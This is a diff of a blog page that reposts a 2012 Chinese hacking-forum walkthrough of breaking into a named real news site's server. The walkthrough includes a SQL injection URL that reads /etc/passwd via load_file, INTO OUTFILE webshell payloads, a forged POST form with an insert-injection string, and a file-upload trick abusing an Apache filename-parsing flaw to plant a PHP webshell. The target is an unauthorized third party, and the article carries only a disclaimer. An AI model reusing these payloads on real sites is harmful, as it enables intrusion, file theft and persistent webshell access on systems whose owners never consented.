@@ -1,151 +1,446 @@
-<!DOCTYPE html>
-<html>
 
+ <!DOCTYPE HTML>
+<html  xmlns:wb="http://open.weibo.com/wb">
 <head>
-  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
-  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-  <title>从分析代码学习挖掘漏洞人民网实例 | Blog of Secer</title>
-  <meta name="description" content="" />
-  <meta name="HandheldFriendly" content="True" />
-  <meta name="MobileOptimized" content="320" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
-  <link rel="stylesheet" type="text/css" href="/css/style.css" />
-  <meta name="generator" content="Blog of Secer">
-
+  <meta charset="UTF-8">
   
-  
-  
-
-  
+    <title>从分析代码学习挖掘漏洞人民网实例 | Blog of Secer</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
+    
+    <meta name="author" content="Secer">
+    
+    <meta name="description" content="http://bbs.blackbap.org/forum.php?mod=viewthread&amp;amp;tid=2537  作者注：   近日看到论坛上有人发了个“全能大牛”的文章，颇有感慨。其实所谓的“全能”，是来自对基础知识的扎实根基。本文虽谈不上“全能”，也并非什么大做，仅为证明只要根基扎实，你也可以“全能”渗透。    本文特意选用人民网(people.com.cn)中的某一服务器上Web站点作为讲解实例，详细讲述如何根据一个小漏洞逐步分析，扩大范围完成进一步渗透的。    本文仅供研究和学习，不得用于非法用途，否则后果自负。    出于隐私保护的目的，文章所有截图和url经过处理。    本文版权所有，转载请注明出处：Silic Group Hacker Army [BlackBap.Org]    作者：YoCo Smart    来自：Silic Group    站点：Http://blackbap.org    相信很多人已经厌倦了这个网络里弥漫的注入，弱口令，万能密码。那么有没有遇到过注入找不到后台，数据库为root或者sa账户却无法写入webshell，得到了后台却拿不到webshell，拿到了webshell却无法提权？？？？？    本文所阐述的例子是：    一台Linux服务器是用了Apache 2.2.10架设了php的网站，数据库为MySQL，网站使用了root账户，但是网站没有后台，也没有phpMyAdmin，服务器中存在一个注入点。因为gpc为on，所以无法写入webshell，但是可以读取服务器上一些已知路径的文件。    那么我们就通过本文来讲一下，如何通过这个注入点，进行下一步渗透的。    我们先来简单描述一下注入点(如果不懂php+MySQL的注入，请参见《各色SQL注入文章汇总》)    注入点：  .people.com.cn/vote.php?id=3  这个注入点根据存在的文件名就知道，应该是一个投票页面，因为union只有一个字段，所以直接  .people.com.cn/vote.php?id=3+union+select+load_file(0x2f6574632f706173737764)+from+mysql.user  就能读到文件了。根据错误回显，得到网站路径为/usr/www。因为gpc设置on，所以  union select 一句话的hex into outfile ‘/usr/www/可写目录/webshell.php’  这样是得不到webshell的，查到MySQL.user中设置的host为%，但是这台服务器对外网实际并未开放3306端口，也无法外联。   那么思路是什么呢？    我们来试着读取网站文件的源码来查找一些其他的漏洞。">
+    
+    
+    
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:site" content="333" />
+    <meta name="twitter:title" content="从分析代码学习挖掘漏洞人民网实例 | Blog of Secer" />
+      
+    
+    
+    <link rel="alternate" href="atom.xml" title="Blog of Secer" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/pacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/pacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
 </head>
 
-<!--
-<body class="post-template">
--->
-<body class="home-template">
-<div id="perspective" class="perspective effect-movedown">
-  <div class="container">
-    <!-- wrapper -->
-    <div class="wrapper">
+  <body>
+    <header>
+      <div>
+		
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="Blog of Secer">Blog of Secer</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">首页</a></li>
+					
+						<li><a href="/archives">文章</a></li>
+					
+						<li><a href="/about">关于</a></li>
+					
+						<li><a href="/atom.xml">RSS订阅</a></li>
+					
+					<li>
+					
+					<form class="search" action="/search/index.html" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="text" id="search" name="q" autocomplete="off" maxlength="30" placeholder="Search" />
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
 
-      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
-    <div class="vertical">
-        <div class="site-head-content inner">
-             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
-            <h1 class="blog-title">Blog of Secer</h1>
-            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
-        </div>
-    </div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/797.seo/" title="从分析代码学习挖掘漏洞人民网实例" itemprop="url">从分析代码学习挖掘漏洞人民网实例</a>
+  </h1>
+  <!-- 显示作者
+  <p class="article-author">By
+    
+      <a href="http://ha.cker.in" title="Secer">Secer</a>
+    </p>
+  -->  
+  <p class="article-time">
+    <time datetime="2012-09-03T08:59:18.000Z" itemprop="datePublished">2012-09-03</time>
+    Updated:<time datetime="2016-08-20T11:03:53.000Z" itemprop="dateModified">2016-08-20</time>
+    
+  </p>
 </header>
 
-      
+	<div class="article-content">
+		
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		
+		</div>
+		
+		<p><a href="http://bbs.blackbap.org/forum.php?mod=viewthread&amp;tid=2537&amp;fromuid=4372" target="_blank" rel="external">http://bbs.blackbap.org/forum.php?mod=viewthread&amp;tid=2537</a></p>  <p>作者注：   <br>近日看到论坛上有人发了个“全能大牛”的文章，颇有感慨。其实所谓的“全能”，是来自对基础知识的扎实根基。本文虽谈不上“全能”，也并非什么大做，仅为证明只要根基扎实，你也可以“全能”渗透。    <br>本文特意选用人民网(people.com.cn)中的某一服务器上Web站点作为讲解实例，详细讲述如何根据一个小漏洞逐步分析，扩大范围完成进一步渗透的。    <br>本文仅供研究和学习，不得用于非法用途，否则后果自负。    <br>出于隐私保护的目的，文章所有截图和url经过处理。    <br>本文版权所有，转载请注明出处：Silic Group Hacker Army [BlackBap.Org]    <br>作者：YoCo Smart    <br>来自：Silic Group    <br>站点：<a href="http://blackbap.org/" target="_blank" rel="external">Http://blackbap.org</a>    <br>相信很多人已经厌倦了这个网络里弥漫的注入，弱口令，万能密码。那么有没有遇到过注入找不到后台，数据库为root或者sa账户却无法写入webshell，得到了后台却拿不到webshell，拿到了webshell却无法提权？？？？？    <br>本文所阐述的例子是：    <br>一台Linux服务器是用了Apache 2.2.10架设了php的网站，数据库为MySQL，网站使用了root账户，但是网站没有后台，也没有phpMyAdmin，服务器中存在一个注入点。因为gpc为on，所以无法写入webshell，但是可以读取服务器上一些已知路径的文件。    <br>那么我们就通过本文来讲一下，如何通过这个注入点，进行下一步渗透的。    <br>我们先来简单描述一下注入点(如果不懂php+MySQL的注入，请参见《<a href="http://bbs.blackbap.org/thread-2433-1-1.html" target="_blank" rel="external">各色SQL注入文章汇总</a>》)    <br>注入点：</p>  <p><em>.people.com.cn/vote.php?id=3</em></p>  <p>这个注入点根据存在的文件名就知道，应该是一个投票页面，因为union只有一个字段，所以直接</p>  <p>.people.com.cn/vote.php?id=3+union+select+load_file(0x2f6574632f706173737764)+from+mysql.user</p>  <p>就能读到文件了。根据错误回显，得到网站路径为/usr/www。因为gpc设置on，所以</p>  <p>union select 一句话的hex into outfile ‘/usr/www/可写目录/webshell.php’</p>  <p>这样是得不到webshell的，查到MySQL.user中设置的host为%，但是这台服务器对外网实际并未开放3306端口，也无法外联。   <br>那么思路是什么呢？    <br>我们来试着读取网站文件的源码来查找一些其他的漏洞。    <br></p><a id="more"></a><p>我们首先来读取一下/usr/www/vote.php这个存在注入的文件的代码(节选，有删改)：</p>  <p>require (‘xajax/xajax.inc.php’);</p>  <p>$link=mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;<strong><em>*</em></strong>&quot;) or die (‘数据库连接失败:’.mysql_error());</p>  <p>$select=mysql_select_db(&quot;vote&quot;, $link);</p>  <p>$SID=$_GET[‘sid’];</p>  <p>$typeId=$_GET[‘typeid’];</p>  <p>/<em>这是第1个函数，显示投票结果</em>/</p>  <p>function shownum($SID,$typeId){//点击按钮的返回值</p>  <p>$sql = &quot;select numUp from zhendang where SID = &quot;.$SID.&quot; and typeId=&quot;.$typeId.&quot;&#160;&#160; &quot;;</p>  <p>$info=mysql_query($sql);</p>  <p>$it=mysql_fetch_array($info);</p>  <p>return $it[‘0’];</p>  <p>}</p>  <p>/<em>这是第2个函数，编者已做注释，是投票计数函数</em>/</p>  <p>function updatemysql($SID,$typeId){//点击按钮</p>  <p>$sqladd=&quot;update zhendang set numUp=numUp+1 where SID = &quot;.$SID.&quot; and typeId=&quot;.$typeId.&quot;&#160; &quot;;</p>  <p>mysql_query($sqladd);</p>  <p>}</p>  <p>唯一能看到的就是select一个字段数的注入。这里似乎能够利用的可能性只有注入中的load_file()。   <br>当然了，思路不能只局限在vote.php一个页面，因为要挖漏洞嘛，就一定要深。我读了很多php文件，都没有找到eval()函数，或者是assert()又或者是exec()这样的凡是能造成安全问题的函数。    <br>不过有一个文件引起了我的注意，有一个information.php的文件，看一下文件的代码是哪里引起了我的注意(节选代码，有删减)</p>  <p>if($upload_pic!=&quot;&quot;){</p>  <p>/<em>下面的#注释都是由编写者添加，有调试代码有功能注释</em>/</p>  <p>$allowed_types=array(‘jpg’,’gif’,’png’);</p>  <p>#正则表达式匹配出上传文件的扩展名</p>  <p>preg_match(‘|.(\w+)$|’, $com_pic,$ext);</p>  <p>#print_r($ext);</p>  <p>#转化成小写</p>  <p>$ext = strtolower($ext[1]);</p>  <p>#判断是否在被允许的扩展名里</p>  <p>if(!in_array($ext, $allowed_types)){</p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160; $objResponse-&gt;addAlert(‘不被允许的文件类型’) ;</p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160; return $objResponse;</p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160; }</p>  <p>}</p>  <p>这里有一个函数用于检查上传文件的后缀名。既然有检查功能，想必是会有上传功能的，虽然有后缀名检查，但是我们还是看看为好。   <br>information.php文件中的上传功能用浏览器打开后并没有发现，估计是要注册以后登陆才能用的。    <br>那么再看看它的源码：</p>  <p>&lt;form action=&quot;form.php&quot; method=&quot;post&quot; name=&quot;form1&quot; id=&quot;form1&quot; enctype=&quot;multipart/form-data&quot;&gt;</p>  <p>看来这个上传以后的文件是传给form.php的，而information.php只处理上传文件的后缀名检查。那么我们再看看form.php的代码(节选，有删改)：</p>  <p>&lt;?php</p>  <p>include(&quot;inc.php&quot;);</p>  <p>$user=$_POST[‘user’];</p>  <p>$area=$_POST[‘area’];</p>  <p>$type=$_POST[‘type’];</p>  <p>$title=$_POST[‘title’];</p>  <p>$context=$_POST[‘context’];</p>  <p>$pic=$HTTP_POST_FILES[‘pic’];</p>  <p>//echo $pic[size];</p>  <p>if($title==&quot;&quot;){echo &quot;alert(‘警告!’)&quot;;exit;}</p>  <p>if($context==&quot;&quot;){echo &quot;alert(‘警告!’)&quot;;exit;}</p>  <p>if(!$pic[‘name’]==&quot;&quot;){</p>  <p>//….略</p>  <p>else {</p>  <p>$sql=&quot;insert into plaint(user,area,type,title,content,time) values (‘&quot;.$user.&quot;’,’&quot;.$area.&quot;’,’&quot;.$type.&quot;’,’&quot;.$title.&quot;’,’&quot;.$context.&quot;’,’&quot;.date(&quot;Y-m-d H:i:s&quot;).&quot;’)&quot;;</p>  <p>$link=mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;<strong><em>*</em></strong>&quot;)or die(&quot;数据库异常&quot;);</p>  <p>$select=mysql_select_db(&quot;datab&quot;, $link);</p>  <p>@mysql_query($sql);</p>  <p>@mysql_close();</p>  <p>//…略</p>  <p>粗略的看了一下，inc.php当中居然没有session检查的相关，也就是说，任何人都可以POST数据到form.php   <br>那么我们就根据页面代码构造一个本地POST的html    <br>关于构造本地html文件POST数据，可以参考一下这篇文章：《<a href="http://bbs.blackbap.org/thread-2455-1-1.html" target="_blank" rel="external">POST表单与上传突破JS后缀名检查分析</a>》</p>  <p>&lt;form action=&quot;<a href="http://*.people.com.cn/form.php&amp;quot" target="_blank" rel="external">http://*.people.com.cn/form.php&amp;quot</a>; method=&quot;post&quot; name=&quot;form1&quot; enctype=&quot;multipart/form-data&quot;&gt;</p>  <p>&lt;input type=&quot;text&quot; name=&quot;area&quot; value=&quot;选项1,反正没检查,随便写&quot; /&gt;&lt;br /&gt;</p>  <p>&lt;input type=&quot;text&quot; name=&quot;type&quot; value=&quot;选项2,反正没检查,随便写&quot; /&gt;&lt;br /&gt;</p>  <p>&lt;input type=&quot;text&quot; name=&quot;user&quot; value=&quot;user_name&quot;/&gt;&lt;br /&gt;</p>  <p>&lt;input type=&quot;text&quot; name=&quot;title&quot; value=&quot;各种各种各种题目&quot;&gt;&lt;br /&gt;</p>  <p>&lt;textarea name=&quot;context&quot; cols=&quot;60&quot; rows=&quot;20&quot;&gt;各种各种各种各种各种各种各种各种各种各种各种各种各种各种各种各种各种各种各种&lt;/textarea&gt;&lt;br /&gt;</p>  <p>&lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;</p>  <p>这样试了一下，还真的提示提交成功了。   <br>先在php中eval(echo date(&quot;Y-m-d H:i:s&quot;));看了一下内容：“2012-04-20 13:18:51”    <br>那么根据原系统SQL语句：</p>  <p>$sql=&quot;insert into plaint(user,area,type,title,content,time) values (‘&quot;.$user.&quot;’,’&quot;.$area.&quot;’,’&quot;.$type.&quot;’,’&quot;.$title.&quot;’,’&quot;.$context.&quot;’,’&quot;.date(&quot;Y-m-d H:i:s&quot;).&quot;’)&quot;;</p>  <p>根据注入的思想，我们可以让insert这样执行：</p>  <p>&quot;insert into plaint(user,area,type,title,content,time)values(‘user_name’,’选项1,反正没检查,随便写’,’选项2,反正没检查,随便写’,’各种各种各种题目’,’各种各种各种各’,(select 0x3a into outfile &quot;/usr/ww/可写目录/webshell.php&quot;)’)+–+#’,’2012-04-20 13:18:51’)&quot;</p>  <p>因为insert into支持(字段,字段)values(‘值’,(SQL语句))的用法，而POST可以绕过gpc，这样尝试也许可以写入一句话。   <br>也许上各位看上面的SQL语句大概没明白，我们改改POST的html文件再看看明白不明白呢</p>  <p>&lt;textarea name=&quot;context&quot; cols=&quot;60&quot; rows=&quot;20&quot;&gt;各种各种各种…&lt;/textarea&gt;</p>  <p>&lt;textarea name=&quot;context&quot; cols=&quot;60&quot; rows=&quot;20&quot;&gt;各种各种各种…’,(select 0x3a into outfile &quot;/usr/ww/可写目录/webshell.php&quot;)’)+–+#&lt;/textarea&gt;</p>  <p>这不知道算不算POST注入中的一种呢   <br>不过重复POST数据，却并没有成功。问题出在哪里呢？再好好查查问题吧。    <br>应该出在inc.php，看代码：</p>  <p>&lt;?php</p>  <p>//要过滤的非法字符</p>  <p>$ArrFiltrate=array(&quot;’&quot;,&quot;script&quot;,&quot;&lt;&quot;,&quot;&gt;&quot;,&quot;union&quot;,&quot;select&quot;,&quot;update&quot;,&quot;and&quot;,&quot;create&quot;,&quot;drop&quot;,&quot;or&quot;,&quot;insert&quot;,&quot;load_file&quot;,&quot;0x&quot;,&quot;etc&quot;,&quot;www&quot;,&quot;Mr.&quot;,&quot;etc&quot;,&quot;passwd&quot;,&quot;print&quot;,&quot;<a href="http://&amp;quot" target="_blank" rel="external">http://&amp;quot</a>;);</p>  <p>$StrGoUrl=&quot;&quot;;</p>  <p>//是否存在数组中的值</p>  <p>function FunStringExist($StrFiltrate,$ArrFiltrate){</p>  <p>foreach ($ArrFiltrate as $key=&gt;$value){</p>  <p>if (eregi($value,$StrFiltrate)){</p>  <p>return true;</p>  <p>}</p>  <p>}</p>  <p>return false;</p>  <p>}</p>  <p>//合并$_POST 和 $_GET</p>  <p>if(function_exists(array_merge)){</p>  <p>$ArrPostAndGet=array_merge($HTTP_POST_VARS,$HTTP_GET_VARS);</p>  <p>}else{</p>  <p>foreach($HTTP_POST_VARS as $key=&gt;$value){</p>  <p>$ArrPostAndGet[]=$value;</p>  <p>}</p>  <p>foreach($HTTP_GET_VARS as $key=&gt;$value){</p>  <p>$ArrPostAndGet[]=$value;</p>  <p>}</p>  <p>}</p>  <p>看来还是有过滤检查的，这样的话insert into的注入就不能用了，或者说可能过滤以后有inc.php这个页面的注入都不能用了，虽然过滤的不太完善，不过也够费劲的了。   <br>上面是当上传文件为空的时候，系统执行的SQL语句，我们再来看看上传文件不为空的代码：</p>  <p>if(!$pic[‘name’]==&quot;&quot;){</p>  <p>$dest_dir=’upload’;</p>  <p>$dest=$dest<em>dir.’/‘.date(&quot;ydm&quot;).&quot;</em>&quot;.$user.&quot;.jpg&quot;;</p>  <p>//设置文件名为日期加上文件名避免重复</p>  <p>$r=move_uploaded_file($com_pic[‘tmp_name’],$dest);</p>  <p>$sql=&quot;insert into complaint(user,area,type,title,content,time,pic)values(‘&quot;.$user.&quot;’,’&quot;.$area.&quot;’,’&quot;.$type.&quot;’,’&quot;.$title.&quot;’,’&quot;.$context.&quot;’,’&quot;.date(&quot;Y-m-d H:i:s&quot;).&quot;’,’&quot;.$dest.&quot;’)&quot;;</p>  <p>$link=mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;<strong><em>*</em></strong>&quot;) or die(&quot;数据库异常&quot;);</p>  <p>$select=mysql_select_db(&quot;datab&quot;,$link);</p>  <p>@mysql_query($sql);</p>  <p>@mysql_close();</p>  <p>我们结合上面的代码</p>  <p>$user=$<em>POST[‘user’];</em></p>  <p>//对用户名取值，但是没做session验证</p>  <p>&lt;input type=&quot;hidden&quot; name=&quot;user&quot; id=&quot;user&quot; value=&quot;9476&quot;/&gt;</p>  <p>然后在看：   <br>$dest= ‘upload/‘.date(&quot;ydm&quot;).&quot;&quot;.$user.&quot;.jpg&quot;;    <br>只要上传的文件是.gif和.jpg和.png的后缀名，那么上传的文件就应该放在：    <br>upload/122004<em>9476.jpg    <br>其中upload/目录是固定的，122004是当前的日期，12是2012年，2004是04月20日，中间的下划线</em>是固定的，最后的.jpg也是固定的后缀名    <br>唯一可以变的就是$user这个变量。    <br>这套程序看似漏洞百出，其实也不太好突破。    <br>关于上传文件的命名方式，我们不妨参考一下：《<a href="http://bbs.blackbap.org/thread-2281-1-1.html" target="_blank" rel="external">PHPWEB网站管理系统后台Kedit编辑器漏洞利用代码</a>》</p>  <p>&lt;form action=&quot;<a href="http://*.people.com.cn/form.php&amp;quot" target="_blank" rel="external">http://*.people.com.cn/form.php&amp;quot</a>; method=&quot;post&quot; name=&quot;form&quot; enctype=&quot;multipart/form-data&quot;&gt;</p>  <p>&lt;input type=&quot;text&quot; name=&quot;area&quot; value=&quot;选项1,反正没检查,随便写&quot; /&gt;&lt;br /&gt;</p>  <p>&lt;input type=&quot;text&quot; name=&quot;type&quot; value=&quot;选项2,反正没检查,随便写&quot; /&gt;&lt;br /&gt;</p>  <p>&lt;input type=&quot;text&quot; name=&quot;user&quot; value=&quot;a.php;a.aaa&quot;/&gt;&lt;br /&gt;</p>  <p>&lt;input type=&quot;file&quot; name=&quot;pic&quot; id=&quot;pic&quot; /&gt;&lt;br /&gt;</p>  <p>&lt;input type=&quot;text&quot; name=&quot;title&quot; value=&quot;各种各种各种题目&quot;&gt;&lt;br /&gt;</p>  <p>&lt;textarea name=&quot;context&quot; cols=&quot;60&quot; rows=&quot;20&quot;&gt;各种各种各种各种各种各种各种各种各种各种各种各种各种各种各种各种各种各种各种&lt;/textarea&gt;&lt;br /&gt;</p>  <p>&lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;</p>  <p>构造好了以后，就能POST上去一个文件了。根据对代码的分析，最终得到的文件应该就是：upload/122004_a.php;a.aaa.jpg了   <br>根据资料，Apache2中存在解析漏洞的版本为&lt;=2.2.11    <br>而人民网的此服务器Apache的版本是Apache 2.2.10 你懂的    <br>本来打算用一个终止符%00来终止后缀名.jpg，但是最终得到的却是把%00带进了真实的文件名，通过访问upload/122004_a.php%2500a.jpg证实    <br>后来才明白，%00这个通过POST提交以后似乎不能转换成真正的终止符\0???需要直接POST这个\0终止符才行    <br>此文章基于对隐私的保护，故将真实url隐去，未上传截图也是出于此目的。    <br>如果有人怀疑本文章所选例子的真实性，我只能说文章中的代码和实际代码确实不是一模一样，但是漏洞是一模一样的    <br>本文出自：Silic Group核心群 &amp; Silic Group项目开发群</p>  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-share" id="share">
 
-<main class="content" role="main">
-  <article class="post">
-    <span class="post-meta">
-      <time datetime="2012-09-03T08:59:18.000Z" itemprop="datePublished">
-          2012-09-03
-      </time>
-    
-    
-    | 
-    <a href='/tag/漏洞/'>漏洞</a>,
-    
-    <a href='/tag/注入/'>注入</a>
-    
-    
-</span>
-    <h1 class="post-title">从分析代码学习挖掘漏洞人民网实例</h1>
-    <section class="post-content">
-      <p><a href="http://bbs.blackbap.org/forum.php?mod=viewthread&amp;tid=2537&amp;fromuid=4372" target="_blank" rel="external">http://bbs.blackbap.org/forum.php?mod=viewthread&amp;tid=2537</a></p>  <p>作者注：   <br>近日看到论坛上有人发了个“全能大牛”的文章，颇有感慨。其实所谓的“全能”，是来自对基础知识的扎实根基。本文虽谈不上“全能”，也并非什么大做，仅为证明只要根基扎实，你也可以“全能”渗透。    <br>本文特意选用人民网(people.com.cn)中的某一服务器上Web站点作为讲解实例，详细讲述如何根据一个小漏洞逐步分析，扩大范围完成进一步渗透的。    <br>本文仅供研究和学习，不得用于非法用途，否则后果自负。    <br>出于隐私保护的目的，文章所有截图和url经过处理。    <br>本文版权所有，转载请注明出处：Silic Group Hacker Army [BlackBap.Org]    <br>作者：YoCo Smart    <br>来自：Silic Group    <br>站点：<a href="http://blackbap.org/" target="_blank" rel="external">Http://blackbap.org</a>    <br>相信很多人已经厌倦了这个网络里弥漫的注入，弱口令，万能密码。那么有没有遇到过注入找不到后台，数据库为root或者sa账户却无法写入webshell，得到了后台却拿不到webshell，拿到了webshell却无法提权？？？？？    <br>本文所阐述的例子是：    <br>一台Linux服务器是用了Apache 2.2.10架设了php的网站，数据库为MySQL，网站使用了root账户，但是网站没有后台，也没有phpMyAdmin，服务器中存在一个注入点。因为gpc为on，所以无法写入webshell，但是可以读取服务器上一些已知路径的文件。    <br>那么我们就通过本文来讲一下，如何通过这个注入点，进行下一步渗透的。    <br>我们先来简单描述一下注入点(如果不懂php+MySQL的注入，请参见《<a href="http://bbs.blackbap.org/thread-2433-1-1.html" target="_blank" rel="external">各色SQL注入文章汇总</a>》)    <br>注入点：</p>  <p><em>.people.com.cn/vote.php?id=3</em></p>  <p>这个注入点根据存在的文件名就知道，应该是一个投票页面，因为union只有一个字段，所以直接</p>  <p>.people.com.cn/vote.php?id=3+union+select+load_file(0x2f6574632f706173737764)+from+mysql.user</p>  <p>就能读到文件了。根据错误回显，得到网站路径为/usr/www。因为gpc设置on，所以</p>  <p>union select 一句话的hex into outfile ‘/usr/www/可写目录/webshell.php’</p>  <p>这样是得不到webshell的，查到MySQL.user中设置的host为%，但是这台服务器对外网实际并未开放3306端口，也无法外联。   <br>那么思路是什么呢？    <br>我们来试着读取网站文件的源码来查找一些其他的漏洞。    <br></p><a id="more"></a><p>我们首先来读取一下/usr/www/vote.php这个存在注入的文件的代码(节选，有删改)：</p>  <p>require (‘xajax/xajax.inc.php’);</p>  <p>$link=mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;<strong><em>*</em></strong>&quot;) or die (‘数据库连接失败:’.mysql_error());</p>  <p>$select=mysql_select_db(&quot;vote&quot;, $link);</p>  <p>$SID=$_GET[‘sid’];</p>  <p>$typeId=$_GET[‘typeid’];</p>  <p>/<em>这是第1个函数，显示投票结果</em>/</p>  <p>function shownum($SID,$typeId){//点击按钮的返回值</p>  <p>$sql = &quot;select numUp from zhendang where SID = &quot;.$SID.&quot; and typeId=&quot;.$typeId.&quot;&#160;&#160; &quot;;</p>  <p>$info=mysql_query($sql);</p>  <p>$it=mysql_fetch_array($info);</p>  <p>return $it[‘0’];</p>  <p>}</p>  <p>/<em>这是第2个函数，编者已做注释，是投票计数函数</em>/</p>  <p>function updatemysql($SID,$typeId){//点击按钮</p>  <p>$sqladd=&quot;update zhendang set numUp=numUp+1 where SID = &quot;.$SID.&quot; and typeId=&quot;.$typeId.&quot;&#160; &quot;;</p>  <p>mysql_query($sqladd);</p>  <p>}</p>  <p>唯一能看到的就是select一个字段数的注入。这里似乎能够利用的可能性只有注入中的load_file()。   <br>当然了，思路不能只局限在vote.php一个页面，因为要挖漏洞嘛，就一定要深。我读了很多php文件，都没有找到eval()函数，或者是assert()又或者是exec()这样的凡是能造成安全问题的函数。    <br>不过有一个文件引起了我的注意，有一个information.php的文件，看一下文件的代码是哪里引起了我的注意(节选代码，有删减)</p>  <p>if($upload_pic!=&quot;&quot;){</p>  <p>/<em>下面的#注释都是由编写者添加，有调试代码有功能注释</em>/</p>  <p>$allowed_types=array(‘jpg’,’gif’,’png’);</p>  <p>#正则表达式匹配出上传文件的扩展名</p>  <p>preg_match(‘|.(\w+)$|’, $com_pic,$ext);</p>  <p>#print_r($ext);</p>  <p>#转化成小写</p>  <p>$ext = strtolower($ext[1]);</p>  <p>#判断是否在被允许的扩展名里</p>  <p>if(!in_array($ext, $allowed_types)){</p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160; $objResponse-&gt;addAlert(‘不被允许的文件类型’) ;</p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160; return $objResponse;</p>  <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160; }</p>  <p>}</p>  <p>这里有一个函数用于检查上传文件的后缀名。既然有检查功能，想必是会有上传功能的，虽然有后缀名检查，但是我们还是看看为好。   <br>information.php文件中的上传功能用浏览器打开后并没有发现，估计是要注册以后登陆才能用的。    <br>那么再看看它的源码：</p>  <p>&lt;form action=&quot;form.php&quot; method=&quot;post&quot; name=&quot;form1&quot; id=&quot;form1&quot; enctype=&quot;multipart/form-data&quot;&gt;</p>  <p>看来这个上传以后的文件是传给form.php的，而information.php只处理上传文件的后缀名检查。那么我们再看看form.php的代码(节选，有删改)：</p>  <p>&lt;?php</p>  <p>include(&quot;inc.php&quot;);</p>  <p>$user=$_POST[‘user’];</p>  <p>$area=$_POST[‘area’];</p>  <p>$type=$_POST[‘type’];</p>  <p>$title=$_POST[‘title’];</p>  <p>$context=$_POST[‘context’];</p>  <p>$pic=$HTTP_POST_FILES[‘pic’];</p>  <p>//echo $pic[size];</p>  <p>if($title==&quot;&quot;){echo &quot;alert(‘警告!’)&quot;;exit;}</p>  <p>if($context==&quot;&quot;){echo &quot;alert(‘警告!’)&quot;;exit;}</p>  <p>if(!$pic[‘name’]==&quot;&quot;){</p>  <p>//….略</p>  <p>else {</p>  <p>$sql=&quot;insert into plaint(user,area,type,title,content,time) values (‘&quot;.$user.&quot;’,’&quot;.$area.&quot;’,’&quot;.$type.&quot;’,’&quot;.$title.&quot;’,’&quot;.$context.&quot;’,’&quot;.date(&quot;Y-m-d H:i:s&quot;).&quot;’)&quot;;</p>  <p>$link=mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;<strong><em>*</em></strong>&quot;)or die(&quot;数据库异常&quot;);</p>  <p>$select=mysql_select_db(&quot;datab&quot;, $link);</p>  <p>@mysql_query($sql);</p>  <p>@mysql_close();</p>  <p>//…略</p>  <p>粗略的看了一下，inc.php当中居然没有session检查的相关，也就是说，任何人都可以POST数据到form.php   <br>那么我们就根据页面代码构造一个本地POST的html    <br>关于构造本地html文件POST数据，可以参考一下这篇文章：《<a href="http://bbs.blackbap.org/thread-2455-1-1.html" target="_blank" rel="external">POST表单与上传突破JS后缀名检查分析</a>》</p>  <p>&lt;form action=&quot;<a href="http://*.people.com.cn/form.php&amp;quot" target="_blank" rel="external">http://*.people.com.cn/form.php&amp;quot</a>; method=&quot;post&quot; name=&quot;form1&quot; enctype=&quot;multipart/form-data&quot;&gt;</p>  <p>&lt;input type=&quot;text&quot; name=&quot;area&quot; value=&quot;选项1,反正没检查,随便写&quot; /&gt;&lt;br /&gt;</p>  <p>&lt;input type=&quot;text&quot; name=&quot;type&quot; value=&quot;选项2,反正没检查,随便写&quot; /&gt;&lt;br /&gt;</p>  <p>&lt;input type=&quot;text&quot; name=&quot;user&quot; value=&quot;user_name&quot;/&gt;&lt;br /&gt;</p>  <p>&lt;input type=&quot;text&quot; name=&quot;title&quot; value=&quot;各种各种各种题目&quot;&gt;&lt;br /&gt;</p>  <p>&lt;textarea name=&quot;context&quot; cols=&quot;60&quot; rows=&quot;20&quot;&gt;各种各种各种各种各种各种各种各种各种各种各种各种各种各种各种各种各种各种各种&lt;/textarea&gt;&lt;br /&gt;</p>  <p>&lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;</p>  <p>这样试了一下，还真的提示提交成功了。   <br>先在php中eval(echo date(&quot;Y-m-d H:i:s&quot;));看了一下内容：“2012-04-20 13:18:51”    <br>那么根据原系统SQL语句：</p>  <p>$sql=&quot;insert into plaint(user,area,type,title,content,time) values (‘&quot;.$user.&quot;’,’&quot;.$area.&quot;’,’&quot;.$type.&quot;’,’&quot;.$title.&quot;’,’&quot;.$context.&quot;’,’&quot;.date(&quot;Y-m-d H:i:s&quot;).&quot;’)&quot;;</p>  